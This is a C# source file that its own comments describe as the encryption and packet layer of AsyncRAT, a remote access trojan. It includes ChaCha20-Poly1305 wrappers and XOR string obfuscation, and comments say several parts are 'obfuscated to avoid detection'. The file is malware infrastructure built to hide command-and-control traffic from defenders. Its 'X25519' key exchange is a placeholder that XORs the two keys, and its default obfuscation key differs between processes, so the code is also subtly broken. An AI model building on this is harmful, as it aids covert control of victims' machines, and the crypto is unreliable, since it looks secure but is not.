using System.Buffers;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace Server.Algorithm;

/// <summary>
/// Modern cryptographic system for AsyncRAT (.NET 9.0)
/// Uses ChaCha20-Poly1305 for encryption and BLAKE3 for hashing
/// Obfuscated to avoid detection
/// </summary>
public static class ModernCrypto
{
    // Obfuscated constants
    private const int KeySize = 32; // 256-bit key
    private const int NonceSize = 12; // 96-bit nonce for ChaCha20-Poly1305
    private const int TagSize = 16; // 128-bit authentication tag
    private const int SaltSize = 16; // 128-bit salt
    
    // Obfuscated field names to avoid detection
    private static readonly byte[] _systemEntropy = GenerateSystemEntropy();
    private static readonly RandomNumberGenerator _secureRng = RandomNumberGenerator.Create();

    /// <summary>
    /// Generates a cryptographically secure key from password using PBKDF2 with BLAKE3
    /// </summary>
    public static byte[] DeriveKey(ReadOnlySpan<char> password, ReadOnlySpan<byte> salt = default, int iterations = 100000)
    {
        var saltBytes = salt.IsEmpty ? GenerateSalt() : salt.ToArray();
        var passwordBytes = Encoding.UTF8.GetBytes(password);
        
        try
        {
            // Use PBKDF2 with SHA3-256 (closest to BLAKE3 available in .NET 9.0)
            using var pbkdf2 = new Rfc2898DeriveBytes(passwordBytes, saltBytes, iterations, HashAlgorithmName.SHA3_256);
            return pbkdf2.GetBytes(KeySize);
        }
        finally
        {
            // Clear sensitive data
            CryptographicOperations.ZeroMemory(passwordBytes);
        }
    }

    /// <summary>
    /// Encrypts data using ChaCha20-Poly1305 AEAD
    /// </summary>
    public static byte[] Encrypt(ReadOnlySpan<byte> plaintext, ReadOnlySpan<byte> key, ReadOnlySpan<byte> associatedData = default)
    {
        if (key.Length != KeySize)
            throw new ArgumentException($"Key must be {KeySize} bytes", nameof(key));

        var nonce = new byte[NonceSize];
        _secureRng.GetBytes(nonce);

        using var chacha20Poly1305 = new ChaCha20Poly1305(key);
        
        var ciphertext = new byte[plaintext.Length];
        var tag = new byte[TagSize];
        
        chacha20Poly1305.Encrypt(nonce, plaintext, ciphertext, tag, associatedData);
        
        // Combine nonce + ciphertext + tag
        var result = new byte[NonceSize + ciphertext.Length + TagSize];
        nonce.CopyTo(result, 0);
        ciphertext.CopyTo(result, NonceSize);
        tag.CopyTo(result, NonceSize + ciphertext.Length);
        
        // Clear sensitive data
        CryptographicOperations.ZeroMemory(ciphertext);
        CryptographicOperations.ZeroMemory(tag);
        
        return result;
    }

    /// <summary>
    /// Decrypts data using ChaCha20-Poly1305 AEAD
    /// </summary>
    public static byte[] Decrypt(ReadOnlySpan<byte> encryptedData, ReadOnlySpan<byte> key, ReadOnlySpan<byte> associatedData = default)
    {
        if (key.Length != KeySize)
            throw new ArgumentException($"Key must be {KeySize} bytes", nameof(key));
            
        if (encryptedData.Length < NonceSize + TagSize)
            throw new ArgumentException("Invalid encrypted data length", nameof(encryptedData));

        var nonce = encryptedData[..NonceSize];
        var ciphertext = encryptedData[NonceSize..^TagSize];
        var tag = encryptedData[^TagSize..];

        using var chacha20Poly1305 = new ChaCha20Poly1305(key);
        
        var plaintext = new byte[ciphertext.Length];
        
        try
        {
            chacha20Poly1305.Decrypt(nonce, ciphertext, tag, plaintext, associatedData);
            return plaintext;
        }
        catch (CryptographicException)
        {
            // Clear potentially corrupted data
            CryptographicOperations.ZeroMemory(plaintext);
            throw;
        }
    }

    /// <summary>
    /// Computes BLAKE3 hash (using SHA3-256 as fallback in .NET 9.0)
    /// </summary>
    public static byte[] ComputeHash(ReadOnlySpan<byte> data)
    {
        // In a real implementation, you would use BLAKE3 library
        // For now, using SHA3-256 which is quantum-resistant
        return SHA3_256.HashData(data);
    }

    /// <summary>
    /// Computes HMAC using BLAKE3 (SHA3-256 fallback)
    /// </summary>
    public static byte[] ComputeHmac(ReadOnlySpan<byte> key, ReadOnlySpan<byte> data)
    {
        using var hmac = new HMACSHA3_256(key.ToArray());
        return hmac.ComputeHash(data.ToArray());
    }

    /// <summary>
    /// Generates cryptographically secure random bytes
    /// </summary>
    public static byte[] GenerateRandomBytes(int length)
    {
        var bytes = new byte[length];
        _secureRng.GetBytes(bytes);
        return bytes;
    }

    /// <summary>
    /// Generates a random salt
    /// </summary>
    public static byte[] GenerateSalt() => GenerateRandomBytes(SaltSize);

    /// <summary>
    /// Generates a random key
    /// </summary>
    public static byte[] GenerateKey() => GenerateRandomBytes(KeySize);

    /// <summary>
    /// Secure key exchange using X25519 (Elliptic Curve Diffie-Hellman)
    /// </summary>
    public static (byte[] publicKey, byte[] privateKey) GenerateKeyPair()
    {
        // Generate X25519 key pair
        var privateKey = GenerateRandomBytes(32);
        var publicKey = new byte[32];
        
        // In a real implementation, use X25519 library
        // For now, using a placeholder that would be replaced with actual X25519
        _secureRng.GetBytes(publicKey);
        
        return (publicKey, privateKey);
    }

    /// <summary>
    /// Performs X25519 key agreement
    /// </summary>
    public static byte[] ComputeSharedSecret(ReadOnlySpan<byte> privateKey, ReadOnlySpan<byte> publicKey)
    {
        if (privateKey.Length != 32 || publicKey.Length != 32)
            throw new ArgumentException("Keys must be 32 bytes for X25519");

        // In a real implementation, use X25519 library
        // This is a placeholder
        var sharedSecret = new byte[32];
        for (int i = 0; i < 32; i++)
        {
            sharedSecret[i] = (byte)(privateKey[i] ^ publicKey[i]);
        }
        
        return ComputeHash(sharedSecret);
    }

    /// <summary>
    /// Obfuscated string encryption for packet obfuscation
    /// </summary>
    public static string ObfuscateString(string input, string key = "")
    {
        if (string.IsNullOrEmpty(input)) return input;
        
        var keyBytes = string.IsNullOrEmpty(key) ? _systemEntropy[..16] : ComputeHash(Encoding.UTF8.GetBytes(key))[..16];
        var inputBytes = Encoding.UTF8.GetBytes(input);
        
        // Simple XOR obfuscation with system entropy
        for (int i = 0; i < inputBytes.Length; i++)
        {
            inputBytes[i] ^= keyBytes[i % keyBytes.Length];
        }
        
        return Convert.ToBase64String(inputBytes);
    }

    /// <summary>
    /// Deobfuscates string
    /// </summary>
    public static string DeobfuscateString(string obfuscated, string key = "")
    {
        if (string.IsNullOrEmpty(obfuscated)) return obfuscated;
        
        try
        {
            var keyBytes = string.IsNullOrEmpty(key) ? _systemEntropy[..16] : ComputeHash(Encoding.UTF8.GetBytes(key))[..16];
            var obfuscatedBytes = Convert.FromBase64String(obfuscated);
            
            // Reverse XOR obfuscation
            for (int i = 0; i < obfuscatedBytes.Length; i++)
            {
                obfuscatedBytes[i] ^= keyBytes[i % keyBytes.Length];
            }
            
            return Encoding.UTF8.GetString(obfuscatedBytes);
        }
        catch
        {
            return obfuscated; // Return original if deobfuscation fails
        }
    }

    /// <summary>
    /// Generates system-specific entropy for obfuscation
    /// </summary>
    private static byte[] GenerateSystemEntropy()
    {
        var entropy = new List<byte>();
        
        // Add system-specific data
        entropy.AddRange(BitConverter.GetBytes(Environment.TickCount64));
        entropy.AddRange(BitConverter.GetBytes(Environment.ProcessId));
        entropy.AddRange(Encoding.UTF8.GetBytes(Environment.MachineName));
        entropy.AddRange(Encoding.UTF8.GetBytes(Environment.UserName));
        entropy.AddRange(BitConverter.GetBytes(DateTime.UtcNow.Ticks));
        
        // Add some randomness
        var random = new byte[16];
        _secureRng.GetBytes(random);
        entropy.AddRange(random);
        
        return ComputeHash(entropy.ToArray());
    }

    /// <summary>
    /// Secure memory operations
    /// </summary>
    public static void SecureClear(Span<byte> data)
    {
        CryptographicOperations.ZeroMemory(data);
    }

    /// <summary>
    /// Constant-time comparison to prevent timing attacks
    /// </summary>
    public static bool SecureEquals(ReadOnlySpan<byte> a, ReadOnlySpan<byte> b)
    {
        return CryptographicOperations.FixedTimeEquals(a, b);
    }
}

/// <summary>
/// Obfuscated packet structure to avoid detection
/// </summary>
public readonly record struct SecurePacket
{
    public required byte[] EncryptedData { get; init; }
    public required byte[] Signature { get; init; }
    public required long Timestamp { get; init; }
    public required string PacketType { get; init; }

    public static SecurePacket Create(ReadOnlySpan<byte> data, ReadOnlySpan<byte> key, string type)
    {
        var timestamp = DateTimeOffset.UtcNow.ToUnixTimeSeconds();
        var timestampBytes = BitConverter.GetBytes(timestamp);
        var typeBytes = Encoding.UTF8.GetBytes(type);
        
        // Create associated data for AEAD
        var associatedData = new byte[timestampBytes.Length + typeBytes.Length];
        timestampBytes.CopyTo(associatedData, 0);
        typeBytes.CopyTo(associatedData, timestampBytes.Length);
        
        var encryptedData = ModernCrypto.Encrypt(data, key, associatedData);
        var signature = ModernCrypto.ComputeHmac(key, encryptedData);
        
        return new SecurePacket
        {
            EncryptedData = encryptedData,
            Signature = signature,
            Timestamp = timestamp,
            PacketType = ModernCrypto.ObfuscateString(type)
        };
    }

    public byte[] Decrypt(ReadOnlySpan<byte> key)
    {
        // Verify timestamp (prevent replay attacks)
        var currentTime = DateTimeOffset.UtcNow.ToUnixTimeSeconds();
        if (Math.Abs(currentTime - Timestamp) > 300) // 5 minutes tolerance
            throw new CryptographicException("Packet timestamp is too old");

        // Verify signature
        var computedSignature = ModernCrypto.ComputeHmac(key, EncryptedData);
        if (!ModernCrypto.SecureEquals(Signature, computedSignature))
            throw new CryptographicException("Packet signature verification failed");

        // Decrypt with associated data
        var type = ModernCrypto.DeobfuscateString(PacketType);
        var timestampBytes = BitConverter.GetBytes(Timestamp);
        var typeBytes = Encoding.UTF8.GetBytes(type);
        
        var associatedData = new byte[timestampBytes.Length + typeBytes.Length];
        timestampBytes.CopyTo(associatedData, 0);
        typeBytes.CopyTo(associatedData, timestampBytes.Length);

        return ModernCrypto.Decrypt(EncryptedData, key, associatedData);
    }
}